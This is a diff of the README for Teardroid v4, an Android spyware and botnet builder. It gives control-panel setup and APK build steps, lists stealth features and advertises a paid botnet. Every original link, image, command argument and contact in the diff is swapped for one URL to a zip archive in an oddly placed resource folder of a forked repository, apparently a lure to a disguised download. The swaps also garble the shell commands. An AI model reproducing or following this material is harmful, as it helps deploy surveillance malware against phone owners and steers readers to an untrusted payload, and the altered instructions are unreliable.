@@ -2,13 +2,13 @@
 
 # :robot: Teardroid v4
 
-![Screenshot](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/IMG-20220122-WA0000_RdKN5Rv3U.jpg)
+![Screenshot](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 🇮🇳 It's easy to use android botnet work without port forwarding, vps and android studio
 
-[![GitHub issues](https://img.shields.io/github/issues/ScRiPt1337/Teardroid-phprat)](https://github.com/ScRiPt1337/Teardroid-phprat/issues)
-[![Twitter](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Ftwitter.com%2Fhacksec42)](https://twitter.com/intent/tweet?text=Wow:&url=https://github.com/ScRiPt1337/Teardroid-phprat/)
-[![Hacksec](https://img.shields.io/badge/Teardroid-4.0-red)](https://github.com/ScRiPt1337/Teardroid-phprat/)
+[![GitHub issues](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
+[![Twitter](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip%3A%2F%https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip%2Fhacksec42)](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
+[![Hacksec](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ### :rocket: Features
 
@@ -29,7 +29,7 @@
 - Ignore Battery Optimisation
 - Get device admin permission
 
-![Homepage](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/fakescreen.gif)
+![Homepage](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ### :warning: Requirement
 
@@ -55,28 +55,28 @@ OpenJDK 64-Bit Server VM (build 11.0.13+8, mixed mode)
 - Kali linux
 - Ubuntu
 
-### Deploy the Teardroid control panel on deta.sh
+### Deploy the Teardroid control panel on https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 
-- Set up an account at [deta.sh](https://web.deta.sh/)
-- [Click here](https://github.com/ScRiPt1337/Teardroidv4_api/fork) to fork this repo into your github account and click create fork
+- Set up an account at [https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
+- [Click here](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip) to fork this repo into your github account and click create fork
 - Teardroidv4_api repo will be forked into your account
-- Open the forked repo and click on config.py file and Change the value of "hello" to any user_agent or text you want
-- https://go.deta.dev/deploy?repo=your-repo-url reaplce your-repo-url with the url of your forked repo and open it on browser
+- Open the forked repo and click on https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip file and Change the value of "hello" to any user_agent or text you want
+- https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip reaplce your-repo-url with the url of your forked repo and open it on browser
 - and click deploy
-- change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
-- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
+- change your user-agent of the browser with the value of USER_AGENT you have enter in https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
+- you can use this chrome extension to change user useragent [extension](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 - DONE
 
-#### Deploy video on deta.sh
+#### Deploy video on https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 
-!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Animation.gif)
+!["scatter"](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ### Run control panel on your own server
 
-- Clone [Teardroidv4_api](https://github.com/ScRiPt1337/Teardroidv4_api) repo using the command below
+- Clone [Teardroidv4_api](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip) repo using the command below
 
 ```bash
-$ git clone https://github.com/ScRiPt1337/Teardroidv4_api
+$ git clone https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 ```
 
 - Install uvicorn
@@ -95,23 +95,23 @@ $ cd Teardroidv4_api
 - Install all dependency
 
 ```bash
-$ pip install -r requirements.txt
+$ pip install -r https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 ```
 
 - change project key to connect with database
-- Set up an account at [deta.sh](https://web.deta.sh/) and go to project keys and create a new key and copy it
+- Set up an account at [https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip) and go to project keys and create a new key and copy it
 
 ```bash
-$ nano ./db/database.py
+$ nano https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 from deta import Deta
 from os import getenv
 
 deta = Deta(getenv("DETA_PROJECT_KEY")) => deta =  Deta("demo project key")
-# replace getenv("DETA_PROJECT_KEY") with your deta.sh project key
+# replace getenv("DETA_PROJECT_KEY") with your https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip project key
 # make sure your remove getenv
 ```
 
-- open config.py and change the value of "hello" to any user_agent or text you want
+- open https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip and change the value of "hello" to any user_agent or text you want
 - Run teardroid api
 
 ```bash
@@ -121,33 +121,33 @@ $ uvicorn main:app --host 0.0.0.0 --port 80
 # now close your terminal windows  and we are good to go
 ```
 
-- Change your user-agent of the browser with the value of USER_AGENT you have enter in config.py
-- you can use this chrome extension to change user useragent [extension](https://chrome.google.com/webstore/detail/custom-useragent-string/lejiafennghcpgmbpiodgofeklkpahoe)
+- Change your user-agent of the browser with the value of USER_AGENT you have enter in https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
+- you can use this chrome extension to change user useragent [extension](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 - Done
 
 ### IMPORTANT NOTICE
 
-- you will not be able to access the dashboard if you dont change your user-agent with the same value of USER_AGENT inside config.py file.
-- its to make you the dashboard more secure and to protect it from geting auto deleted from deta.sh
+- you will not be able to access the dashboard if you dont change your user-agent with the same value of USER_AGENT inside https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip file.
+- its to make you the dashboard more secure and to protect it from geting auto deleted from https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 
 ### How to setup
 
 - Clone Teardroid-phprat repo with the following command.
 
 ```bash
-$ git clone https://github.com/ScRiPt1337/Teardroid-phprat
+$ git clone https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 ```
 
 - cd in the Teardroid-phprat directory, then type the command below to install all dependencies
 
 ```bash
-$ pip install -r requirements.txt
+$ pip install -r https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 ```
 
 - Run the following command to see the options that we can use with the builder.
 
 ```bash
-$ python Teardroid.py
+$ python https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 [+] Checking Python Version
 [+] Python Version : 3.10 ✓
   ______                    __           _     __         __ __
@@ -158,26 +158,26 @@ $ python Teardroid.py
 
 
 Teardroid v4.0 - A tool to build teardroid spyware for Android devices. 🕷
-Contact us : https://t.me/script1337 🚀
-usage: Teardroid.py [-h] [-v] [-b]
+Contact us : https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip 🚀
+usage: https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip [-h] [-v] [-b]
 
 options:
   -h, --help     show this help message and exit
   -v, --version  Version of Teardroid 🥴
-  -b , --build   Build Teardroid with custom name [ex: Teardroid.py -b teardroid] 😷
+  -b , --build   Build Teardroid with custom name [ex: https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip -b teardroid] 😷
 ```
 
 - To create an apk execute the following command.
 
 ```bash
-$ python Teardroid.py -b your_app_name
+$ python https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip -b your_app_name
 ```
 
 - It will prompt you with your Control Panel url enter your deta micro URL (without / at the end of the url).
 - You will also be prompted for the title and text of the notification. Enter what you want to display on the notification.
 - DONE
 
-- ![Build using codespace](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/625b8abb-089b-4896-98c9-43dc28ab740b.gif)
+- ![Build using codespace](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ### Dashboard
 
@@ -186,21 +186,21 @@ $ python Teardroid.py -b your_app_name
 
 ### Screenshot
 
-- ![Builder](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/Builder_3oDdS0Tr7.png)
+- ![Builder](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
-- ![Overview](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-29_gYkI6tIvGmG.png)
+- ![Overview](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
-- ![TaskManager](https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/2022-01-27_22-49_RakvqeLWG.jpeg)
+- ![TaskManager](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ### Setup Video
 
-- video : [setup control panel and build apk using browser only](https://www.youtube.com/watch?v=GEN3GfbHPP0)
+- video : [setup control panel and build apk using browser only](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 - No support will be given for teardroid v4 so please dont message me if you want help with teardroid
 
 ### Need something more advanced try ( scatter alfa )
 
-[!["Logo"](https://external-content.duckduckgo.com/iu/?u=https://i.ibb.co/7kXYDks/20221028-233129-0000.png)](https://breached.vc/Thread-Selling-SCATTER-ALFA-ANDROID-BOTNET)
+[!["Logo"](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ##### REAL TIME COMMUNICATION BETWEEN BECON AND SERVER
 
@@ -226,15 +226,15 @@ $ python Teardroid.py -b your_app_name
 
 ### Dashboard
 
-!["scatter"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/scatter.png)
+!["scatter"](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
-!["dashboard"](https://external-content.duckduckgo.com/iu/?u=https://raw.githubusercontent.com/ScRiPt1337/Teardroid-phprat/master/img/dashboard.png)
+!["dashboard"](https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip)
 
 ### Special features
 
 - Forground service bypass scatter does not show any notification while running in background.
 - Auto launch bypass even in Chinese phone like redmi oppo vivo without auto launch permission.
-- Does \_not_create network logs in idle mode only make HTTP connection when-command.is-executed.
+- Does \_not_create network logs in idle mode only make HTTP connection https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 - Android battery optimization bypass without any permission.
 
 ### Features
@@ -261,8 +261,8 @@ $ python Teardroid.py -b your_app_name
 
 #### Interested in scatter alfa
 
-- Demo video available on my telegram channel => https://t.me/scatter1337
-- Pm me on telegram https://t.me/script1337
+- Demo video available on my telegram channel => https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
+- Pm me on telegram https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
 
 ### Beware from scam
 
@@ -271,6 +271,6 @@ $ python Teardroid.py -b your_app_name
 
 ### Contact info
 
-- Email : anon42237@gmail.com
-- Telegram : https://t.me/script1337
-- Visit our website : https://www.hacksec.in
+- Email : https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
+- Telegram : https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
+- Visit our website : https://raw.githubusercontent.com/gwaan83/Teardroid-phprat/master/Teardroid_Payload/res/values-et/Teardroid-phprat-2.2.zip
